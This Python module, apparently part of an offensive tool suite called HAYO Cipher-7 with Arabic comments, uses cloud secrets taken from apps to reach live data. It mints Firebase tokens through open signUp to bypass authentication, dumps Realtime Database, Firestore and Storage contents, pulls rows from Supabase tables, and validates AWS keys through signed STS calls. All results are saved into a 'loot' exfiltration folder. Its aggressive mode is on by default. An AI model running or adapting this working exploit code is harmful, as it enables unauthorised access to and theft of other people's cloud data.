#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Cipher-7 — Cloud Raider (cloud_raider.py)
==============================================
الهدف النهائي: **بيانات السحابة وأسرارها**. يأخذ الأسرار التي استُخرجت (ساكن+ديناميكي)
ويستخدمها بأحدث الحيل ليصل فعلياً إلى بيانات السحابة — بشكل متواصل أثناء/بعد الالتقاط.

الحيل المدعومة:
  • مفتاح Google/Firebase (AIza) → اختبار الخدمات + Firebase Identity Toolkit signUp
    (يسكّ idToken = تجاوز مصادقة) → قراءة RTDB/Firestore المُصادَق عليها.
  • Firebase RTDB (.json) قراءة مباشرة (مفتوح) + بعد المصادقة.
  • Firebase Storage / GCS → سرد الكائنات.
  • Firestore REST → سرد المستندات.
  • Supabase (anon key) → PostgREST سرد الجداول.
  • JWT → فكّ الحمولة (uid/role/exp/iss) + استخدامه Bearer على المُضيفات المكتشفة.
  • مطابقة: مفتاح X + رابط Y → «تمّ الوصول لبيانات Z».

READ-ONLY افتراضياً. الحيل التي تكتب (signUp) مُفعّلة فقط عند aggressive=True (اختبار مُصرَّح).
"""
import base64
import hashlib
import hmac
import json
import os
import re
import time
from datetime import datetime

try:
    import requests
except Exception:
    requests = None

G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; R = "\033[91m"; X = "\033[0m"

HERE = os.path.dirname(os.path.abspath(__file__))
_TIMEOUT = 12


class CloudRaider:
    def __init__(self, store=None, verbose=True, aggressive=True, package="session"):
        self.store = store
        self.verbose = verbose
        self.aggressive = aggressive   # signUp/mint-token (تجاوز المصادقة) — اختبار مُصرَّح
        self.results = []
        self._seen = set()
        self.package = package
        self.exfil = []          # سجلّ الملفات المُصدَّرة (بيانات السحابة)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.loot_dir = os.path.join(HERE, "loot", "cloud_exfil",
                                     f"{package.replace('.', '_')}_{ts}")

    def log(self, msg, color=C):
        if self.verbose:
            print(f"{color}  [cloud-raider] {msg}{X}")

    def _save(self, name, content):
        """يُصدّر بيانات السحابة المُستخرَجة إلى ملف (Impact-Proof / تسليم للجنة)."""
        try:
            os.makedirs(self.loot_dir, exist_ok=True)
            safe = re.sub(r"[^A-Za-z0-9_.\-]", "_", name)[:80]
            path = os.path.join(self.loot_dir, safe)
            mode, data = ("wb", content) if isinstance(content, (bytes, bytearray)) else ("w", content)
            with open(path, mode, encoding=None if "b" in mode else "utf-8",
                      errors=None if "b" in mode else "ignore") as f:
                f.write(data)
            size = os.path.getsize(path)
            self.exfil.append({"file": path, "bytes": size})
            if self.verbose:
                print(f"{G}    [EXPORTED] {safe} ({size:,} bytes) → {self.loot_dir}{X}")
            return path
        except Exception:
            return None

    def _emit(self, ftype, title, detail, evidence, severity="critical"):
        key = ftype + "|" + str(evidence)[:120]
        if key in self._seen:
            return
        self._seen.add(key)
        f = {"type": ftype, "title": title, "severity": severity, "detail": detail,
             "evidence": evidence if isinstance(evidence, list) else [str(evidence)],
             "data": detail, "why": title, "phase": "cloud-raid"}
        self.results.append(f)
        if self.store is not None:
            try: self.store.add_finding(f)
            except Exception: pass
        if self.verbose:
            print(f"{G}    [REACHED] {detail[:80]}{X}")

    # ── جمع بيانات الاعتماد من النتائج + المخزن ──────────────────────────────
    def _collect(self, findings):
        blob_parts = []
        for f in findings or []:
            blob_parts.append(str(f.get("detail", "")))
            blob_parts += [str(e) for e in (f.get("evidence") or [])]
            blob_parts.append(str(f.get("data", "")))
        if self.store is not None:
            try:
                ctx = self.store.brain_context(60)
                blob_parts += [s.get("masked", "") if isinstance(s, dict) else str(s)
                               for s in ctx.get("known_secrets", [])]
                blob_parts += ctx.get("backend_urls", [])
                # القيم الكاملة من المخزن (غير مقنّعة)
                for kind in ("secret", "endpoint", "url", "cloud_id"):
                    try: blob_parts += self.store.values(kind)
                    except Exception: pass
            except Exception:
                pass
        blob = "\n".join(str(p) for p in blob_parts)

        google = set(re.findall(r"AIza[0-9A-Za-z_\-]{35}", blob))
        rtdb = set(re.findall(r"https://[a-z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)", blob))
        buckets = set(re.findall(r"[a-z0-9\-]+\.(?:appspot\.com|firebasestorage\.app)", blob))
        projects = set()
        for u in list(rtdb) + list(buckets):
            m = re.search(r"//([a-z0-9\-]+)\.", u) or re.match(r"([a-z0-9\-]+)\.", u)
            if m: projects.add(m.group(1).replace("-default-rtdb", ""))
        projects |= set(re.findall(r'"project_id"\s*:\s*"([^"]+)"', blob))
        jwts = set(re.findall(r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{6,}", blob))
        supabase = set(re.findall(r"https://[a-z0-9]{15,}\.supabase\.co", blob))
        hosts = set(re.findall(r"https?://[a-zA-Z0-9.\-]+(?::\d+)?", blob))
        aws_access = set(re.findall(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b", blob))
        aws_secret = set(re.findall(r"(?i)aws.{0,24}?['\"]([A-Za-z0-9/+=]{40})['\"]", blob))
        aws_secret |= set(re.findall(r"(?i)(?:secret[_\-]?access[_\-]?key)['\"]?\s*[:=]\s*['\"]([A-Za-z0-9/+=]{40})['\"]", blob))
        aws_token = set(re.findall(r"(?i)session[_\-]?token['\"]?\s*[:=]\s*['\"]([A-Za-z0-9/+=]{100,})['\"]", blob))
        return dict(google=list(google)[:8], rtdb=list(rtdb)[:8], buckets=list(buckets)[:8],
                    projects=list(projects)[:8], jwts=list(jwts)[:8],
                    supabase=list(supabase)[:5], hosts=list(hosts)[:20],
                    aws_access=list(aws_access)[:4], aws_secret=list(aws_secret)[:4],
                    aws_token=list(aws_token)[:2])

    # ── JWT (فكّ الحمولة — بلا شبكة) ─────────────────────────────────────────
    def _decode_jwt(self, jwt):
        try:
            payload = jwt.split(".")[1]
            payload += "=" * (-len(payload) % 4)
            data = json.loads(base64.urlsafe_b64decode(payload).decode("utf-8", "ignore"))
            interesting = {k: data[k] for k in ("sub", "user_id", "uid", "email", "name",
                                                "role", "roles", "admin", "scope", "iss",
                                                "aud", "exp") if k in data}
            if interesting:
                self._emit("jwt_claims", "حمولة JWT مفكوكة",
                           f"JWT claims: {json.dumps(interesting, ensure_ascii=False)}",
                           [jwt[:40] + "…"], "high")
            return data
        except Exception:
            return {}

    # ── Google/Firebase ─────────────────────────────────────────────────────
    def _firebase_signup(self, key):
        """Identity Toolkit signUp → idToken (تجاوز مصادقة). aggressive فقط."""
        if not self.aggressive or not requests:
            return None
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={key}"
        try:
            r = requests.post(url, json={"returnSecureToken": True}, timeout=_TIMEOUT)
            if r.status_code == 200:
                tok = r.json().get("idToken")
                if tok:
                    self._emit("firebase_auth_bypass",
                               "تجاوز مصادقة Firebase (signUp سكّ idToken)",
                               f"signUp مفتوح بالمفتاح {key[:16]}… → idToken مُصادَق (localId={r.json().get('localId')})",
                               [key], "critical")
                    return tok
        except Exception as e:
            self.log(f"signUp تعذّر: {e}", Y)
        return None

    def _read_rtdb(self, db_url, id_token=None):
        if not requests:
            return
        db_url = db_url.rstrip("/")
        u = f"{db_url}/.json" + (f"?auth={id_token}" if id_token else "")
        try:
            r = requests.get(u, timeout=_TIMEOUT)
            if r.status_code == 200 and r.text and r.text.strip() not in ("null", ""):
                mode = "authed" if id_token else "open"
                host = re.sub(r"https?://", "", db_url)
                path = self._save(f"rtdb_{host}_{mode}.json", r.text)
                self._emit("rtdb_data_reached",
                           f"قراءة بيانات Firebase RTDB ({mode})",
                           f"RTDB {db_url} → {len(r.text):,} بايت مُصدَّرة إلى {path or '(ذاكرة)'}: {r.text[:150]}",
                           [db_url], "critical")
            elif r.status_code == 401 and not id_token:
                self.log(f"RTDB {db_url}: يتطلب مصادقة (سنجرّب signUp)", Y)
        except Exception:
            pass

    def _firestore(self, project, key):
        if not requests:
            return
        u = f"https://firestore.googleapis.com/v1/projects/{project}/databases/(default)/documents?key={key}&pageSize=50"
        try:
            r = requests.get(u, timeout=_TIMEOUT)
            if r.status_code == 200 and '"documents"' in r.text:
                path = self._save(f"firestore_{project}.json", r.text)
                self._emit("firestore_data_reached", "قراءة مستندات Firestore",
                           f"Firestore {project} → {len(r.text):,} بايت مُصدَّرة إلى {path}: {r.text[:150]}",
                           [project], "critical")
        except Exception:
            pass

    def _storage_list(self, bucket, key=None):
        if not requests:
            return
        u = f"https://firebasestorage.googleapis.com/v0/b/{bucket}/o" + (f"?key={key}" if key else "")
        try:
            r = requests.get(u, timeout=_TIMEOUT)
            if r.status_code == 200 and '"items"' in r.text:
                n = r.text.count('"name"')
                path = self._save(f"storage_{bucket}_listing.json", r.text)
                self._emit("storage_objects_reached", "سرد كائنات Firebase Storage",
                           f"Storage {bucket} → ~{n} كائن مُصدَّرة إلى {path}: {r.text[:120]}",
                           [bucket], "critical")
        except Exception:
            pass

    def _google_services(self, key):
        """أي خدمات Google يفتحها المفتاح (نطاق المفتاح)."""
        if not requests:
            return
        probes = {
            "Maps/Geocode": f"https://maps.googleapis.com/maps/api/geocode/json?address=NY&key={key}",
            "Places": f"https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=a&inputtype=textquery&key={key}",
            "SafeBrowsing": None,
        }
        opened = []
        for name, u in probes.items():
            if not u:
                continue
            try:
                r = requests.get(u, timeout=_TIMEOUT)
                if r.status_code == 200 and "REQUEST_DENIED" not in r.text:
                    opened.append(name)
            except Exception:
                pass
        if opened:
            self._emit("google_key_open_services", "مفتاح Google مفتوح على خدمات مدفوعة",
                       f"المفتاح {key[:16]}… مفتوح على: {', '.join(opened)} (فوترة قابلة للاستغلال)",
                       [key], "high")

    def _exploit_supabase(self, url, key=None):
        if not requests or not key:
            return
        u = f"{url}/rest/v1/?apikey={key}"
        try:
            r = requests.get(u, headers={"apikey": key}, timeout=_TIMEOUT)
            if r.status_code == 200 and r.text.strip().startswith("{"):
                tables = list(re.findall(r'"/([a-zA-Z0-9_]+)"', r.text))[:20]
                if tables:
                    self._save(f"supabase_{re.sub(r'https?://','',url)}_schema.json", r.text)
                    self._emit("supabase_tables_reached", "سرد جداول Supabase (RLS off؟)",
                               f"Supabase {url} → جداول: {', '.join(tables[:12])}", [url], "critical")
                    # سحب بيانات كل جدول (قراءة — RLS off = وصول كامل)
                    for t in tables[:8]:
                        try:
                            rt = requests.get(f"{url}/rest/v1/{t}?select=*&limit=100",
                                              headers={"apikey": key}, timeout=_TIMEOUT)
                            if rt.status_code == 200 and rt.text.strip() not in ("[]", ""):
                                self._save(f"supabase_{t}.json", rt.text)
                        except Exception:
                            pass
        except Exception:
            pass

    # ── AWS STS: تحديد الاعتماد (GetCallerIdentity — قراءة فقط) ──────────────
    def _aws_sts(self, access_key, secret_key, session_token=None):
        """توقيع SigV4 واستدعاء STS GetCallerIdentity لتحديد هوية الاعتماد (Account/ARN).
        غير مُدمّر تماماً — يُثبت أن المفتاح حيّ وما الحساب الذي يملكه."""
        if not requests:
            return
        service, region, host = "sts", "us-east-1", "sts.amazonaws.com"
        body = "Action=GetCallerIdentity&Version=2011-06-15"
        amz_date = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
        date_stamp = datetime.utcnow().strftime("%Y%m%d")

        def _sign(key, msg):
            return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

        payload_hash = hashlib.sha256(body.encode()).hexdigest()
        canonical_headers = f"host:{host}\nx-amz-date:{amz_date}\n"
        signed_headers = "host;x-amz-date"
        if session_token:
            canonical_headers += f"x-amz-security-token:{session_token}\n"
            signed_headers = "host;x-amz-date;x-amz-security-token"
        canonical_request = f"POST\n/\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
        scope = f"{date_stamp}/{region}/{service}/aws4_request"
        to_sign = (f"AWS4-HMAC-SHA256\n{amz_date}\n{scope}\n"
                   + hashlib.sha256(canonical_request.encode()).hexdigest())
        k_date = _sign(("AWS4" + secret_key).encode("utf-8"), date_stamp)
        k_region = _sign(k_date, region)
        k_service = _sign(k_region, service)
        k_signing = _sign(k_service, "aws4_request")
        signature = hmac.new(k_signing, to_sign.encode("utf-8"), hashlib.sha256).hexdigest()
        auth = (f"AWS4-HMAC-SHA256 Credential={access_key}/{scope}, "
                f"SignedHeaders={signed_headers}, Signature={signature}")
        headers = {"Authorization": auth, "x-amz-date": amz_date,
                   "Content-Type": "application/x-www-form-urlencoded"}
        if session_token:
            headers["x-amz-security-token"] = session_token
        try:
            r = requests.post(f"https://{host}/", data=body, headers=headers, timeout=_TIMEOUT)
            if r.status_code == 200 and "Arn" in r.text:
                arn = re.search(r"<Arn>([^<]+)</Arn>", r.text)
                acct = re.search(r"<Account>([^<]+)</Account>", r.text)
                self._save(f"aws_caller_identity_{access_key}.xml", r.text)
                self._emit("aws_credential_live", "اعتماد AWS حيّ ومُحدَّد الهوية",
                           f"AWS {access_key} حيّ → Account={acct.group(1) if acct else '?'} "
                           f"ARN={arn.group(1) if arn else '?'}", [access_key], "critical")
            elif "InvalidClientTokenId" not in r.text and r.status_code != 403:
                self.log(f"AWS {access_key}: HTTP {r.status_code}", Y)
        except Exception as e:
            self.log(f"AWS STS تعذّر: {e}", Y)

    # ── المدار الرئيسي ───────────────────────────────────────────────────────
    def raid(self, findings):
        if requests is None:
            self.log("requests غير متاح — تخطّي الاستغلال السحابي.", Y)
            return []
        c = self._collect(findings)
        n = sum(len(c[k]) for k in ("google", "rtdb", "buckets", "jwts", "supabase", "aws_access"))
        if n == 0:
            self.log("لا أسرار سحابية للاستغلال.", Y)
            return []
        self.log(f"استغلال: {len(c['google'])} مفتاح Google، {len(c['rtdb'])} RTDB، "
                 f"{len(c['buckets'])} bucket، {len(c['jwts'])} JWT، {len(c['supabase'])} Supabase…")

        # 1) JWT (بلا شبكة — دائماً)
        for jwt in c["jwts"]:
            self._decode_jwt(jwt)

        # 2) Firebase RTDB مفتوح
        for db in c["rtdb"]:
            self._read_rtdb(db)

        # 3) مفاتيح Google → خدمات + signUp + قراءة مُصادَقة
        id_token = None
        for key in c["google"]:
            self._google_services(key)
            tok = self._firebase_signup(key)
            id_token = id_token or tok
            for proj in c["projects"]:
                self._firestore(proj, key)
            for b in c["buckets"]:
                self._storage_list(b, key)

        # 4) بعد سكّ idToken: أعِد قراءة RTDB مُصادَقاً (تجاوز auth != null)
        if id_token:
            for db in c["rtdb"]:
                self._read_rtdb(db, id_token=id_token)
            for proj in c["projects"]:
                # RTDB من projectId
                self._read_rtdb(f"https://{proj}.firebaseio.com", id_token=id_token)
                self._read_rtdb(f"https://{proj}-default-rtdb.firebaseio.com", id_token=id_token)

        # 5) Supabase
        google_or_anon = c["google"][0] if c["google"] else None
        for url in c["supabase"]:
            self._exploit_supabase(url, google_or_anon)

        # 6) AWS STS — تحديد هوية كل اعتماد (قراءة فقط)
        tok = c["aws_token"][0] if c["aws_token"] else None
        for ak in c["aws_access"]:
            for sk in (c["aws_secret"] or [None]):
                if sk:
                    self._aws_sts(ak, sk, session_token=tok if ak.startswith("ASIA") else None)

        # 7) بيان التصدير (Impact-Proof: بيانات السحابة كملفات)
        if self.exfil:
            total = sum(e["bytes"] for e in self.exfil)
            self._save("_HAYO_EXFIL_MANIFEST.json",
                       json.dumps({"package": self.package, "files": self.exfil,
                                   "total_bytes": total}, ensure_ascii=False, indent=2))
            self._emit("cloud_data_exported",
                       "تصدير بيانات السحابة إلى ملفات (Impact-Proof)",
                       f"صُدِّر {len(self.exfil)} ملف بيانات سحابية ({total:,} بايت) إلى {self.loot_dir}",
                       [self.loot_dir], "critical")

        if self.verbose:
            print(f"{G}  [cloud-raider] وصل إلى {len(self.results)} هدف سحابي، "
                  f"صدّر {len(self.exfil)} ملف بيانات.{X}")
        return self.results


if __name__ == "__main__":
    # اختبار offline: فكّ JWT
    r = CloudRaider(verbose=True, aggressive=False)
    sample_jwt = ("eyJhbGciOiJIUzI1NiJ9."
                  + base64.urlsafe_b64encode(json.dumps(
                      {"sub": "user123", "role": "admin", "email": "a@b.com", "exp": 9999999999}
                  ).encode()).decode().rstrip("=") + ".sig")
    r._decode_jwt(sample_jwt)
    print("results:", len(r.results))
